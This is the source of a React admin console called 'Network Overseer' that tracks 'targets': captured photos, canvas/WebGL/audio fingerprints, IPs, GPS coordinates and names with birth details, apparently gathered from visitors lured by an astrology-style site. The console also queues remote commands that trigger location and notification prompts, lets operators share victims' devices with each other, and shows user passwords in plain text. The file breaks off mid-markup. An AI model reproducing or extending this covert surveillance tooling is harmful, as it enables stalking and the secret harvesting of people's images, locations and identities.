"use client";

import { useEffect, useState, useMemo } from "react";
import { Monitor, Smartphone, Globe, Clock, ChevronRight, X, Fingerprint, Activity, Image as ImageIcon, Trash2, Download, CheckSquare } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

type Scan = {
  id: string;
  createdAt: string;
  image: string;
  publicIp: string;
  userAgent: string;
  referer: string;
  language: string;
  screenResolution: string;
  timezone: string;
  installedFonts: string;
  canvasFingerprint: string;
  webglFingerprint: string;
  audioFingerprint: string;
  hardwareConcurrency: number;
  deviceMemory: number;
  touchSupport: boolean;
  browserPlugins: string;
  batteryLevel: number;
  connectionType: string;
  userName?: string;
  birthDate?: string;
  birthState?: string;
  birthCity?: string;
  birthTime?: string;
  latitude?: number;
  longitude?: number;
  neighborhoodReading?: any;
  reading: any;
};

type DeviceGroup = {
  id: string;
  deviceId?: string;
  publicIp: string;
  userAgent: string;
  screenResolution: string;
  timezone: string;
  language: string;
  deviceMemory: number;
  hardwareConcurrency: number;
  lastSeen?: string;
  scans: Scan[];
};

export default function AdminDashboard() {
  const [devices, setDevices] = useState<DeviceGroup[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<DeviceGroup | null>(null);
  const [selectedImageIndex, setSelectedImageIndex] = useState<number | null>(null);
  const [selectedScans, setSelectedScans] = useState<Set<string>>(new Set());
  const [loading, setLoading] = useState(false);
  const [deviceCommands, setDeviceCommands] = useState<any[]>([]);
  const [selectedDeviceScans, setSelectedDeviceScans] = useState<Scan[]>([]);
  const [isGalleryLoading, setIsGalleryLoading] = useState(false);
  
  // Auth State
  const [authPassword, setAuthPassword] = useState("");
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [userRole, setUserRole] = useState<"SUPER_ADMIN" | "USER" | null>(null);
  const [userId, setUserId] = useState<string | null>(null);
  const [canDelete, setCanDelete] = useState(false);
  const [showUserManagement, setShowUserManagement] = useState(false);
  
  // Users for Super Admin
  const [users, setUsers] = useState<any[]>([]);

  useEffect(() => {
    if (selectedDevice?.deviceId && authPassword) {
      setIsGalleryLoading(true);
      fetch(`/api/devices/${selectedDevice.deviceId}/scans`, { headers: { "Authorization": `Bearer ${authPassword}` } })
        .then(res => res.json())
        .then(data => { if (data.success) setSelectedDeviceScans(data.scans); })
        .catch(() => {})
        .finally(() => setIsGalleryLoading(false));
    } else {
      setSelectedDeviceScans([]);
    }
  }, [selectedDevice, authPassword]);

  const galleryScans = useMemo(() => {
    return selectedDeviceScans.filter(s => s.image);
  }, [selectedDeviceScans]);

  // Approximate storage calculation
  const totalStorageBytes = useMemo(() => {
    let bytes = 0;
    devices.forEach(d => {
      d.scans.forEach(s => {
        bytes += 153600; 
      });
    });
    return bytes;
  }, [devices]);
  
  const storageUsedMB = (totalStorageBytes / (1024 * 1024)).toFixed(2);
  const storagePercent = Math.min(100, (totalStorageBytes / (500 * 1024 * 1024)) * 100);

  const fetchDevices = (isInitial = false) => {
    if (!authPassword) return;
    if (isInitial) setLoading(true);
    fetch("/api/devices", { 
      headers: { "Authorization": `Bearer ${authPassword}` },
      cache: 'no-store'
    })
      .then((res) => res.json())
      .then((res) => {
        if (res.success) setDevices(res.data);
      })
      .catch(() => {})
      .finally(() => { if (isInitial) setLoading(false); });
  };

  const fetchUsers = () => {
    if (userRole !== 'SUPER_ADMIN') return;
    fetch("/api/users", { headers: { "Authorization": `Bearer ${authPassword}` } })
      .then(res => res.json())
      .then(res => { if (res.success) setUsers(res.users); })
      .catch(() => {});
  };

  useEffect(() => {
    const session = localStorage.getItem("admin_session");
    if (session) {
      try {
        const data = JSON.parse(session);
        if (data.expires > Date.now()) {
          setAuthPassword(data.authPassword);
          setUserRole(data.userRole);
          setUserId(data.userId);
          setCanDelete(data.canDelete);
          setIsAuthenticated(true);
        } else {
          localStorage.removeItem("admin_session");
        }
      } catch (e) {}
    }
  }, []);

  useEffect(() => {
    if (!isAuthenticated) return;
    fetchDevices(true);
    if (userRole === 'SUPER_ADMIN') fetchUsers();
    
    const interval = setInterval(() => {
      fetchDevices(false);
      if (selectedDevice?.deviceId) {
        fetch(`/api/commands?deviceId=${selectedDevice.deviceId}&all=true`, { headers: { "Authorization": `Bearer ${authPassword}` } })
          .then(res => res.json())
          .then(data => { if (data.success) setDeviceCommands(data.commands); })
          .catch(() => {});
      }
    }, 5000); // Live update every 5 seconds
    return () => clearInterval(interval);
  }, [isAuthenticated, selectedDevice, userRole, authPassword]);

  // Fetch commands immediately when device is selected
  useEffect(() => {
    if (selectedDevice?.deviceId && authPassword) {
      fetch(`/api/commands?deviceId=${selectedDevice.deviceId}&all=true`, { headers: { "Authorization": `Bearer ${authPassword}` } })
        .then(res => res.json())
        .then(data => { if (data.success) setDeviceCommands(data.commands); })
        .catch(() => {});
    } else {
      setDeviceCommands([]);
    }
  }, [selectedDevice, authPassword]);

  const handleSelectAll = () => {
    if (!selectedDevice) return;
    if (selectedScans.size === galleryScans.length) {
      setSelectedScans(new Set()); // Deselect all
    } else {
      setSelectedScans(new Set(galleryScans.map(s => s.id))); // Select all
    }
  };

  const toggleScanSelection = (e: React.MouseEvent, scanId: string) => {
    e.stopPropagation();
    const newSet = new Set(selectedScans);
    if (newSet.has(scanId)) newSet.delete(scanId);
    else newSet.add(scanId);
    setSelectedScans(newSet);
  };

  const handleBulkDelete = async () => {
    if (selectedScans.size === 0) return;
    if (!confirm(`Are you sure you want to delete ${selectedScans.size} scans?`)) return;
    
    try {
      const res = await fetch("/api/scans", {
        method: "POST",
        headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
        body: JSON.stringify({ action: "delete", scanIds: Array.from(selectedScans) })
      });
      const data = await res.json();
      if (!data.success) throw new Error(data.error);
      setSelectedScans(new Set());
      fetchDevices();
      
      // Update local state for selected device if open
      if (selectedDevice) {
        setSelectedDevice({
          ...selectedDevice,
          scans: selectedDevice.scans.filter(s => !selectedScans.has(s.id))
        });
      }
      setSelectedDeviceScans(prev => prev.filter(s => !selectedScans.has(s.id)));
    } catch (e) {
      alert("Failed to delete scans");
    }
  };

  const handleBulkDownload = () => {
    if (selectedScans.size === 0) return;
    selectedDevice?.scans.forEach(scan => {
      if (selectedScans.has(scan.id) && scan.image) {
        const a = document.createElement("a");
        a.href = scan.image;
        a.download = `scan_${scan.id}.jpg`;
        a.click();
      }
    });
  };

  const handleNextImage = (e: React.MouseEvent) => {
    e.stopPropagation();
    if (selectedDevice && selectedImageIndex !== null && selectedImageIndex < galleryScans.length - 1) {
      setSelectedImageIndex(selectedImageIndex + 1);
    }
  };

  const handlePrevImage = (e: React.MouseEvent) => {
    e.stopPropagation();
    if (selectedDevice && selectedImageIndex !== null && selectedImageIndex > 0) {
      setSelectedImageIndex(selectedImageIndex - 1);
    }
  };

  const sendCommand = async (command: string, payload?: string) => {
    if (!selectedDevice?.deviceId) {
      alert("This device is running an older version and does not support commands. Please wait for them to reconnect.");
      return;
    }
    try {
      const res = await fetch("/api/commands", {
        method: "POST",
        headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
        body: JSON.stringify({ deviceId: selectedDevice.deviceId, command, payload })
      });
      if (res.ok) alert("Command queued successfully. It will execute on the device within 5 seconds if they are online.");
    } catch (e) {
      alert("Failed to queue command.");
    }
  };

  const handleDeleteDevice = async (deviceId: string | undefined) => {
    if (!deviceId || userRole !== 'SUPER_ADMIN') return;
    if (!confirm(`Are you sure you want to completely delete this device? This action cannot be undone.`)) return;
    
    try {
      const res = await fetch("/api/scans", {
        method: "POST",
        headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
        body: JSON.stringify({ action: "deleteDevice", deviceId })
      });
      if (res.ok) {
        setSelectedDevice(null);
        fetchDevices();
      }
    } catch (e) {
      alert("Failed to delete device");
    }
  };

  const handleCreateUser = async () => {
    const name = prompt("Enter username for the new user:");
    if (!name) return;
    const res = await fetch("/api/users", {
      method: "POST",
      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
      body: JSON.stringify({ action: "CREATE_USER", name })
    });
    if (res.ok) fetchUsers();
  };

  const handleToggleShare = async (userId: string, deviceId: string, isShared: boolean) => {
    const action = isShared ? "UNSHARE_DEVICE" : "SHARE_DEVICE";
    await fetch("/api/users", {
      method: "POST",
      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
      body: JSON.stringify({ action, userId, deviceId })
    });
    fetchUsers();
  };

  const handleEditPassword = async (userId: string) => {
    const newPassword = prompt("Enter new 6-character alphanumeric password:");
    if (!newPassword || newPassword.length !== 6 || !/^[a-zA-Z0-9]+$/.test(newPassword)) {
      alert("Password must be exactly 6 alphanumeric characters");
      return;
    }
    const res = await fetch("/api/users", {
      method: "POST",
      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
      body: JSON.stringify({ action: "CHANGE_PASSWORD", userId, newPassword })
    });
    const data = await res.json();
    if (data.success) fetchUsers();
    else alert(data.error);
  };

  const handleShareAll = async (userId: string) => {
    if (!confirm("Share all current devices with this user?")) return;
    const deviceIds = devices.map(d => d.deviceId).filter(Boolean);
    await fetch("/api/users", {
      method: "POST",
      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
      body: JSON.stringify({ action: "SHARE_ALL", userId, deviceIds })
    });
    fetchUsers();
  };

  const handleUnshareAll = async (userId: string) => {
    if (!confirm("Revoke all devices from this user?")) return;
    await fetch("/api/users", {
      method: "POST",
      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` },
      body: JSON.stringify({ action: "UNSHARE_ALL", userId })
    });
    fetchUsers();
  };

  if (!isAuthenticated) {
    return <LoginScreen onLogin={(pwd, data) => {
      setAuthPassword(pwd);
      setUserRole(data.role);
      setUserId(data.userId || null);
      setCanDelete(data.canDelete || false);
      setIsAuthenticated(true);
      localStorage.setItem("admin_session", JSON.stringify({
        authPassword: pwd,
        userRole: data.role,
        userId: data.userId || null,
        canDelete: data.canDelete || false,
        expires: Date.now() + 3600000 // 1 hour
      }));
    }} />;
  }

  return (
    <div className="min-h-screen bg-[#0a0a0f] bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-blue-900/20 via-[#0a0a0f] to-[#0a0a0f] text-slate-300 font-sans p-6 md:p-12 relative">
      <header className="mb-12 border-b border-white/5 pb-8 flex flex-col md:flex-row md:items-center justify-between gap-6">
        <div>
          <h1 className="text-3xl font-light text-white mb-2 tracking-wide">
            Network <span className="font-semibold text-blue-400">Overseer</span>
          </h1>
          <p className="text-sm uppercase tracking-[0.2em] opacity-50">Live Surveillance \ {devices.length} Targets Active</p>
        </div>
        
        <div className="flex items-center gap-6">
          {/* Storage Quota */}
          <div className="flex flex-col items-end gap-1.5">
            <div className="flex justify-between w-40 text-[10px] uppercase tracking-widest text-white/50">
              <span>{storageUsedMB} MB Used</span>
              <span>500 MB</span>
            </div>
            <div className="h-1.5 w-40 rounded-full bg-white/10 overflow-hidden">
              <div 
                className={`h-full rounded-full ${storagePercent > 80 ? 'bg-red-500' : 'bg-blue-500'}`} 
                style={{ width: `${storagePercent}%` }}
              />
            </div>
          </div>
          
          <div className="h-12 w-12 rounded-full border border-white/10 bg-white/5 flex items-center justify-center backdrop-blur-md cursor-pointer hover:bg-white/10 transition" onClick={() => userRole === 'SUPER_ADMIN' && setShowUserManagement(true)}>
            <Fingerprint className="text-blue-400 opacity-80" />
          </div>
        </div>
      </header>

      {showUserManagement && userRole === 'SUPER_ADMIN' && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md p-4">
          <div className="bg-[#0f0f13] border border-white/10 rounded-2xl w-full max-w-4xl max-h-[80vh] flex flex-col shadow-2xl overflow-hidden relative">
            <div className="p-6 border-b border-white/10 flex justify-between items-center bg-white/5">
              <h2 className="text-xl font-light text-white">User Management</h2>
              <button onClick={() => setShowUserManagement(false)} className="text-white/50 hover:text-white"><X size={20} /></button>
            </div>
            <div className="p-6 overflow-y-auto custom-scrollbar flex-1">
              <button onClick={handleCreateUser} className="mb-6 bg-blue-500/20 text-blue-400 px-4 py-2 rounded-lg text-sm font-semibold hover:bg-blue-500/30 transition">
                + Create New User
              </button>
              
              <div className="space-y-4">
                {users.map(u => (
                  <div key={u.id} className="border border-white/10 rounded-xl p-4 bg-black/40">
                    <div className="flex justify-between items-start mb-4">
                      <div>
                        <h3 className="text-white font-medium">{u.name}</h3>
                        <p className="text-xs font-mono text-purple-400 mt-1 cursor-pointer hover:text-purple-300 transition" onClick={() => handleEditPassword(u.id)}>
                          Pass: {u.password} ✎
                        </p>
                      </div>
                      <div className="flex items-center gap-4">
                        <label className="flex items-center gap-2 text-xs text-white/70">
                          <input type="checkbox" checked={u.canDelete} onChange={(e) => {
                            fetch("/api/users", { method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` }, body: JSON.stringify({ action: "SET_CAN_DELETE", userId: u.id, canDelete: e.target.checked }) }).then(fetchUsers);
                          }} className="rounded bg-black border-white/20 accent-blue-500" />
                          Can Delete Photos
                        </label>
                        <button onClick={() => {
                          if (confirm('Delete user?')) fetch("/api/users", { method: "POST", headers: { "Content-Type": "application/json", "Authorization": `Bearer ${authPassword}` }, body: JSON.stringify({ action: "DELETE_USER", userId: u.id }) }).then(fetchUsers);
                        }} className="text-red-400/50 hover:text-red-400"><Trash2 size={16} /></button>
                      </div>
                    </div>
                    
                    <div className="mt-4 border-t border-white/5 pt-4">
                      <div className="flex justify-between items-center mb-3">
                        <p className="text-xs uppercase tracking-widest text-white/40">Shared Devices</p>
                        <div className="flex gap-2">
                          <button onClick={() => handleShareAll(u.id)} className="text-[10px] bg-blue-500/20 text-blue-400 px-2 py-1 rounded hover:bg-blue-500/30 transition">Share All</button>
                          <button onClick={() => handleUnshareAll(u.id)} className="text-[10px] bg-red-500/20 text-red-400 px-2 py-1 rounded hover:bg-red-500/30 transition">Revoke All</button>
                        </div>
                      </div>
                      <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                        {devices.map(d => {
                          const isShared = u.sharedDevices?.some((sd: any) => sd.deviceId === d.deviceId);
                          return (
                            <button
                              key={d.id}
                              onClick={() => handleToggleShare(u.id, d.deviceId!, isShared)}
                              className={`text-left text-xs p-2 rounded border transition-colors ${isShared ? 'bg-blue-500/20 border-blue-500/50 text-blue-200' : 'bg-white/5 border-white/10 text-white/40 hover:bg-white/10'}`}
                            >
                              <div className="truncate">{d.publicIp}</div>
                              <div className="opacity-50 text-[10px] truncate">{d.userAgent?.split(' ')[0]}</div>
                            </button>
                          );
                        })}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      <main className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
        {loading ? (
          Array(6).fill(0).map((_, i) => (
            <div key={`shimmer-${i}`} className="rounded-2xl border border-white/10 bg-white/[0.02] p-6 h-[220px] animate-pulse">
              <div className="flex justify-between mb-6">
                <div className="flex gap-3">
                  <div className="h-10 w-10 rounded-lg bg-white/5"></div>
                  <div className="space-y-2 mt-1">
                    <div className="h-3.5 w-24 bg-white/5 rounded"></div>
                    <div className="h-2.5 w-16 bg-white/5 rounded"></div>
                  </div>
                </div>
                <div className="h-6 w-16 bg-white/5 rounded-full"></div>
              </div>
              <div className="space-y-4">
                <div className="flex justify-between border-b border-white/5 pb-2">
                  <div className="h-2.5 w-20 bg-white/5 rounded"></div>
                  <div className="h-2.5 w-24 bg-white/5 rounded"></div>
                </div>
                <div className="flex justify-between border-b border-white/5 pb-2">
                  <div className="h-2.5 w-20 bg-white/5 rounded"></div>
                  <div className="h-2.5 w-32 bg-white/5 rounded"></div>
                </div>
                <div className="flex justify-between pb-2">
                  <div className="h-2.5 w-20 bg-white/5 rounded"></div>
                  <div className="h-2.5 w-24 bg-white/5 rounded"></div>
                </div>
              </div>
            </div>
          ))
        ) : (
          devices.map((device, i) => {
          const isOnline = device.lastSeen ? (new Date().getTime() - new Date(device.lastSeen).getTime()) < 15000 : false;
          return (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: i * 0.05 }}
              key={device.id}
              onClick={() => setSelectedDevice(device)}
              className="group relative cursor-pointer overflow-hidden rounded-2xl border border-white/10 bg-white/[0.02] p-6 backdrop-blur-sm transition-all hover:border-blue-500/50 hover:bg-blue-500/5"
            >
              {/* Online Indicator */}
              <div className="absolute top-6 right-6 flex items-center gap-2">
                <span className="text-[10px] font-mono opacity-50">{isOnline ? 'LIVE' : (device.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : 'OFFLINE')}</span>
                <div className={`h-2 w-2 rounded-full ${isOnline ? 'bg-green-500 animate-pulse' : 'bg-gray-600'}`} />
              </div>
              
              <div className="relative z-10">
                <div className="flex items-start justify-between mb-6">
                  <div className="flex items-center gap-3">
                    <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-blue-500/10 text-blue-400">
                      {device.userAgent?.includes("Mobile") ? <Smartphone size={20} /> : <Monitor size={20} />}
                    </div>
                    <div>
                      <h3 className="font-mono text-sm text-white">{device.publicIp || "Unknown IP"}</h3>
                      <p className="text-xs opacity-50 flex items-center gap-1 mt-1">
                        <Globe size={10} /> {device.timezone}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-1.5 rounded-full bg-white/5 px-2.5 py-1 text-xs font-medium text-white/80">
                    <ImageIcon size={12} className="opacity-60" />
                    {device.scans.filter(s => s.image).length} Photos / {device.scans.length} Scans
                  </div>
                </div>

                <div className="space-y-3 text-xs opacity-70">
                  {(() => {
                    const names = Array.from(new Set(device.scans.map(s => s.userName).filter(Boolean)));
                    if (names.length > 0) {
                      return (
                        <div className="flex justify-between border-b border-white/5 pb-2">
                          <span className="text-purple-400">Identities</span>
                          <span className="font-sans text-purple-300 max-w-[150px] truncate text-right">
                            {names.join(", ")}
                          </span>
                        </div>
                      );
                    }
                    return null;
                  })()}
                  <div className="flex justify-between border-b border-white/5 pb-2">
                    <span>Resolution</span>
                    <span className="font-mono text-white/90">{device.screenResolution || "Unknown"}</span>
                  </div>
                  <div className="flex justify-between border-b border-white/5 pb-2">
                    <span>Hardware</span>
                    <span className="font-mono text-white/90">{device.hardwareConcurrency} Cores / {device.deviceMemory}GB RAM</span>
                  </div>
                  <div className="flex justify-between pb-2">
                    <span>System</span>
                    <span className="truncate max-w-[150px] text-white/90">{device.userAgent?.split(" ")[0]}</span>
                  </div>
                </div>

                <div className="mt-6 flex items-center justify-between text-xs font-semibold text-blue-400/80 transition-colors group-hover:text-blue-400">
                  <span>VIEW GALLERY</span>
                  <ChevronRight size={14} className="transition-transform group-hover:translate-x-1" />
                </div>
              </div>
            </motion.div>
          );
        })
        )}
      </main>

      <AnimatePresence>
        {selectedDevice && selectedImageIndex === null && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-40 flex items-center justify-center p-4 backdrop-blur-xl bg-black/60"
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="relative flex h-[90vh] w-[95vw] max-w-7xl flex-col overflow-hidden rounded-3xl border border-white/10 bg-[#0f0f13] shadow-2xl"
            >
              <button
                onClick={() => setSelectedDevice(null)}
                className="absolute right-6 top-6 z-10 rounded-full bg-white/10 p-2 text-white/60 transition-colors hover:bg-white/20 hover:text-white"
              >
                <X size={20} />
              </button>

              <div className="grid h-full grid-cols-1 lg:grid-cols-[1fr_350px]">
                {/* Left: Gallery */}
                <div className="flex flex-col overflow-y-auto border-r border-white/5 p-8 custom-scrollbar">
                  <div className="mb-6 flex items-center justify-between">
                    <div className="flex items-center gap-4">
                      <h2 className="text-2xl font-light text-white">Target Feed</h2>
                      <button 
                        onClick={handleSelectAll}
                        className="text-xs text-blue-400 hover:text-blue-300 underline underline-offset-2 transition"
                      >
                        {selectedScans.size === galleryScans.length ? "Deselect All" : "Select All"}
                      </button>
                    </div>
                    
                    {selectedScans.size > 0 && (
                      <div className="flex items-center gap-2">
                        <span className="text-xs text-white/50 mr-2">{selectedScans.size} selected</span>
                        <button onClick={handleBulkDownload} className="flex h-8 w-8 items-center justify-center rounded bg-blue-500/20 text-blue-400 transition hover:bg-blue-500/40">
                          <Download size={14} />
                        </button>
                        {(userRole === 'SUPER_ADMIN' || canDelete) && (
                          <button onClick={handleBulkDelete} className="flex h-8 w-8 items-center justify-center rounded bg-red-500/20 text-red-400 transition hover:bg-red-500/40">
                            <Trash2 size={14} />
                          </button>
                        )}
                      </div>
                    )}
                  </div>
                  <div className="grid grid-cols-2 md:grid-cols-3 xl:grid-cols-4 gap-4">
                    {isGalleryLoading ? (
                      Array.from({ length: 8 }).map((_, i) => (
                        <div key={i} className="aspect-video rounded-xl bg-white/5 animate-pulse border border-white/5" />
                      ))
                    ) : galleryScans.map((scan, i) => (
                      <div 
                        key={scan.id} 
                        onClick={() => setSelectedImageIndex(i)}
                        className={`group relative aspect-video overflow-hidden rounded-xl bg-black/50 border cursor-pointer transition-all ${selectedScans.has(scan.id) ? 'border-blue-500 ring-2 ring-blue-500/50' : 'border-white/5 hover:border-white/20'}`}
                      >
                        {scan.image ? (
                          <img src={scan.image} alt="Scan capture" className="h-full w-full object-cover opacity-80 transition-transform duration-700 group-hover:scale-110 group-hover:opacity-100" />
                        ) : (
                          <div className="flex h-full w-full items-center justify-center text-white/20"><ImageIcon /></div>
                        )}
                        <div className="absolute bottom-0 inset-x-0 bg-gradient-to-t from-black/80 to-transparent p-3 flex justify-between items-end">
                          <p className="flex items-center gap-1 text-[10px] text-white/70">
                            <Clock size={10} /> {new Date(scan.createdAt).toLocaleTimeString()}
                          </p>
                        </div>
                        <button 
                          onClick={(e) => toggleScanSelection(e, scan.id)}
                          className={`absolute top-2 right-2 rounded p-1.5 transition-all ${selectedScans.has(scan.id) ? 'bg-blue-500 text-white opacity-100' : 'bg-black/40 text-white/50 opacity-0 group-hover:opacity-100 hover:bg-black/80 hover:text-white'}`}
                        >
                          <CheckSquare size={14} />
                        </button>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Right: Fingerprint + User Data */}
                <div className="overflow-y-auto bg-black/20 p-8 custom-scrollbar">
                  {/* Find the most recent scan with user details and location */}
                  {(() => {
                    const scanWithUser = selectedDeviceScans.find(s => s.userName);
                    const scanWithLocation = selectedDeviceScans.find(s => s.latitude || s.longitude);

                    return (
                      <>
                        {/* User-submitted details */}
                        {scanWithUser && (
                          <>
                            <h3 className="mb-4 flex items-center gap-2 text-sm font-semibold uppercase tracking-widest text-purple-400">
                              ✦ User Profile
                            </h3>
                            <div className="space-y-4 mb-6">
                              <InfoBlock label="Name" value={scanWithUser.userName} />
                              <InfoBlock label="Date of Birth" value={scanWithUser.birthDate} />
                              <InfoBlock label="Birth State" value={scanWithUser.birthState} />
                              <InfoBlock label="Birth City" value={scanWithUser.birthCity} />
                              <InfoBlock label="Birth Time" value={scanWithUser.birthTime || "Not provided"} />
                            </div>
                            <div className="h-px bg-white/5 mb-6" />
                          </>
                        )}

                        {/* GPS Location */}
                        {scanWithLocation && (
                          <>
                            <h3 className="mb-4 flex items-center gap-2 text-sm font-semibold uppercase tracking-widest text-green-400">
                              📍 GPS Location
                            </h3>
                            <div className="space-y-4 mb-6">
                              <InfoBlock label="Latitude" value={String(scanWithLocation.latitude ?? "Unknown")} />
                              <InfoBlock label="Longitude" value={String(scanWithLocation.longitude ?? "Unknown")} />
                              <a
                                href={`https://maps.google.com/?q=${scanWithLocation.latitude},${scanWithLocation.longitude}`}
                                target="_blank"
                                rel="noreferrer"
                                className="inline-block text-xs text-blue-400 underline"
                              >
                                Open in Google Maps ↗
                              </a>
                            </div>
                            <div className="h-px bg-white/5 mb-6" />
                          </>
                        )}
                      </>
                    );
                  })()}

                  <h3 className="mb-4 flex items-center gap-2 text-sm font-semibold uppercase tracking-widest text-red-400">
                    <Activity size={16} /> Remote Commands
                  </h3>
                  <div className="flex flex-col gap-2 mb-4">
                    <button onClick={() => sendCommand('REQUEST_LOCATION')} className="bg-red-500/10 border border-red-500/20 text-red-400 hover:bg-red-500/20 rounded py-2 px-3 text-xs font-semibold transition text-left">Trigger Location Prompt</button>
                    <button onClick={() => sendCommand('REQUEST_NOTIFICATION')} className="bg-orange-500/10 border border-orange-500/20 text-orange-400 hover:bg-orange-500/20 rounded py-2 px-3 text-xs font-semibold transition text-left">Trigger Notification Prompt</button>
                    <button onClick={() => {
                      const msg = prompt("Enter the notification message to send:", "The cosmos aligns for you.");
                      if (msg) sendCommand('SHOW_NOTIFICATION', msg);
                    }} className="bg-blue-500/10 border border-blue-500/20 text-blue-400 hover:bg-blue-500/20 rounded py-2 px-3 text-xs font-semibold transition text-left">Send Push Notification</button>
                  </div>
                  
                  {deviceCommands.length > 0 && (
                    <div className="mb-6 space-y-1 rounded bg-black/40 p-3 border border-white/5">
                      <div className="text-[10px] font-bold text-white/40 uppercase mb-2">Command History</div>
                      {deviceCommands.map(cmd => (
                        <div key={cmd.id} className="flex justify-between items-center text-[10px] font-mono">
                          <span className="text-white/70">{cmd.command.replace('REQUEST_', '')}</span>
                          <span className={`px-1.5 py-0.5 rounded text-[9px] uppercase tracking-wider
                            ${cmd.status === 'completed' || cmd.status === 'granted' || cmd.status === 'delivered' ? 'bg-green-500/20 text-green-400' : ''}
                            ${cmd.status === 'pending' || cmd.status === 'processing' ? 'bg-yellow-500/20 text-yellow-400' : ''}
                            ${cmd.status === 'denied' || cmd.status === 'failed' ? 'bg-red-500/20 text-red-400' : ''}
                            ${cmd.status === 'unsupported' ? 'bg-gray-500/20 text-gray-400' : ''}
                          `}>
                            {cmd.status}
                          </span>
                        </div>
                      ))}
                    </div>
                  )}
                  
                  <div className="h-px bg-white/5 mb-6" />

                  <h3 className="mb-6 flex items-center gap-2 text-sm font-semibold uppercase tracking-widest text-blue-400">
                    <Fingerprint size={16} /> Device Identity
                  </h3>
                  
                  <div className="space-y-6">
                    <InfoBlock label="IP Address" value={selectedDevice.publicIp} />
                    <InfoBlock label="User Agent" value={selectedDevice.userAgent} />
                    <InfoBlock label="Language" value={selectedDevice.language} />
                    <InfoBlock label="Timezone" value={selectedDevice.timezone} />
                    
                    <div className="h-px bg-white/5" />
                    
                    <InfoBlock label="Hardware Concurrency" value={`${selectedDevice.hardwareConcurrency} Logical Cores`} />
                    <InfoBlock label="Device Memory" value={`${selectedDevice.deviceMemory} GB`} />
                    <InfoBlock label="Screen Resolution" value={selectedDevice.screenResolution} />
                    
                    <div className="h-px bg-white/5" />
                    
                    <InfoBlock label="WebGL Fingerprint" value={selectedDevice.scans[0]?.webglFingerprint || "Not captured"} truncate />
                    <InfoBlock label="Canvas Fingerprint" value={selectedDevice.scans[0]?.canvasFingerprint || "Not captured"} truncate />
                    <InfoBlock label="Audio Context" value={selectedDevice.scans[0]?.audioFingerprint || "Not captured"} truncate />
                    
                    {userRole === 'SUPER_ADMIN' && (
                      <button 
                        onClick={() => handleDeleteDevice(selectedDevice.deviceId)}
                        className="w-full mt-4 bg-red-500/10 border border-red-500/20 text-red-400 hover:bg-red-500/20 rounded py-2 px-3 text-xs font-semibold transition"
                      >
                        Delete Entire Device
                      </button>
                    )}
                  </div>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {selectedDevice && selectedImageIndex !== null && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-3xl"
            onClick={() => setSelectedImageIndex(null)}
          >
            <div className="absolute top-6 left-6 z-10 bg-black/40 px-3 py-1.5 rounded-full backdrop-blur-md text-white/80 text-xs tracking-widest uppercase border border-white/10">
              {selectedImageIndex + 1} / {galleryScans.length}
            </div>
            
            <button
              onClick={() => setSelectedImageIndex(null)}
              className="absolute right-6 top-6 z-10 rounded-full bg-white/10 p-3 text-white/80 transition-colors hover:bg-white/20 hover:text-white"
            >
              <X size={24} />
            </button>

            {selectedImageIndex > 0 && (
              <button
                onClick={handlePrevImage}
                className="absolute left-6 top-1/2 -translate-y-1/2 z-10 rounded-full bg-white/5 p-4 text-white/50 backdrop-blur-md transition-all hover:bg-white/20 hover:text-white hover:scale-110"
              >
                <ChevronRight size={32} className="rotate-180" />
              </button>
            )}

            {selectedImageIndex < galleryScans.length - 1 && (
              <button
                onClick={handleNextImage}
                className="absolute right-6 top-1/2 -translate-y-1/2 z-10 rounded-full bg-white/5 p-4 text-white/50 backdrop-blur-md transition-all hover:bg-white/20 hover:text-white hover:scale-110"
              >
                <ChevronRight size={32} />
              </button>
            )}

            <motion.div
              key={selectedImageIndex}
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.2 }}
              className="relative h-[85vh] w-[85vw] max-w-6xl"
              onClick={(e) => e.stopPropagation()}
            >
              {galleryScans[selectedImageIndex]?.image ? (
                <img
                  src={galleryScans[selectedImageIndex].image}
                  alt="Full resolution capture"
                  className="h-full w-full object-contain drop-shadow-2xl"
                />
              ) : (
                <div className="flex h-full w-full items-center justify-center text-white/20">
                  <ImageIcon size={64} />
                </div>
              )}
              
              <div className="absolute bottom-4 left-1/2 -translate-x-1/2 flex items-center gap-2 text-sm text-white/70 bg-black/80 px-4 py-2 rounded-full backdrop-blur-md border border-white/10 z-10">
                <Clock size={14} className="text-white/50" /> 
                {new Date(galleryScans[selectedImageIndex]?.createdAt || Date.now()).toLocaleString()}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
